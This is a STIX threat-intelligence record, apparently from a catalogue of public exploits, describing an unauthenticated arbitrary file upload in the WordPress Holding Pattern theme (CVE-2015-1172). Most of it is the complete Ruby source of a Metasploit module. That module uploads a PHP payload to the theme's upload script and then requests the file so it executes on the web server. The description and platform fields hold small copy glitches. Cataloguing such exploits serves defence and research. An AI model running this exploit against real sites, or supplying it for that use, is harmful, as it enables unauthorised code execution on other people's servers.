{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--993edb78-64f3-45a1-b4c9-604328444592",
    "created": "2024-08-14T17:13:54.323945Z",
    "modified": "2024-08-14T17:13:54.323949Z",
    "name": "WordPress Holding Pattern Theme Arbitrary File Upload",
    "description": " This module exploits a file upload vulnerability in all versions of the Holding Pattern theme found in the upload_file.php script which contains no session or file validation. It allows unauthenticated users to upload files of any type and subsequently execute PHP scripts in the context of the web server.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_holding_pattern_file_upload.rb",
            "external_id": "wp_holding_pattern_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1172"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7784"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'socket'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'WordPress Holding Pattern Theme Arbitrary File Upload',\n      'Description'     => %q{\n          This module exploits a file upload vulnerability in all versions of the\n          Holding Pattern theme found in the upload_file.php script which contains\n          no session or file validation. It allows unauthenticated users to upload\n          files of any type and subsequently execute PHP scripts in the context of\n          the web server.\n        },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Alexander Borg', # Vulnerability disclosure\n          'rastating'       # Metasploit module\n        ],\n      'References'      =>\n        [\n          ['CVE', '2015-1172'],\n          ['WPVDB', '7784'],\n          ['PACKETSTORM', '130282']\n        ],\n      'DisclosureDate'  => '2015-02-11',\n      'Platform'        => 'php',\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [['holding_pattern', {}]],\n      'DefaultTarget'   => 0\n    ))\n  end\n\n  def check\n    check_theme_version_from_readme('holding_pattern')\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def holding_pattern_uploads_url\n    normalize_uri(wordpress_url_themes, 'holding_pattern', 'uploads/')\n  end\n\n  def holding_pattern_uploader_url\n    normalize_uri(wordpress_url_themes, 'holding_pattern', 'admin', 'upload-file.php')\n  end\n\n  def generate_mime_message(payload, payload_name)\n    data = Rex::MIME::Message.new\n    target_ip = IPSocket.getaddress(rhost)\n    field_name = Rex::Text.md5(target_ip)\n\n    # In versions 1.2 and 1.3 of the theme, the upload directory must\n    # be encoded in base64 and sent with the request. To maintain\n    # compatibility with the hardcoded path of ../uploads in prior\n    # versions, we will send the same path in the request.\n    upload_path = Rex::Text.encode_base64('../uploads')\n\n    data.add_part(payload.encoded, 'application/x-php', nil, \"form-data; name=\\\"#{field_name}\\\"; filename=\\\"#{payload_name}\\\"\")\n    data.add_part(upload_path, nil, nil, 'form-data; name=\"upload_path\"')\n    data\n  end\n\n  def exploit\n    print_status(\"Preparing payload...\")\n    payload_name = \"#{Rex::Text.rand_text_alpha_lower(10)}.php\"\n    data = generate_mime_message(payload, payload_name)\n\n    print_status(\"Uploading payload...\")\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => holding_pattern_uploader_url,\n      'ctype'     => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'      => data.to_s\n    )\n    fail_with(Failure::Unreachable, 'No response from the target') if res.nil?\n    fail_with(Failure::UnexpectedReply, \"Server responded with status code #{res.code}\") if res.code != 200\n    payload_url = normalize_uri(holding_pattern_uploads_url, payload_name)\n\n    print_status(\"Executing the payload at #{payload_url}\")\n    register_files_for_cleanup(payload_name)\n    send_request_cgi({ 'uri' => payload_url, 'method'  => 'GET' }, 5)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-11",
    "x_mitre_platforms": [
        "php'"
    ]
}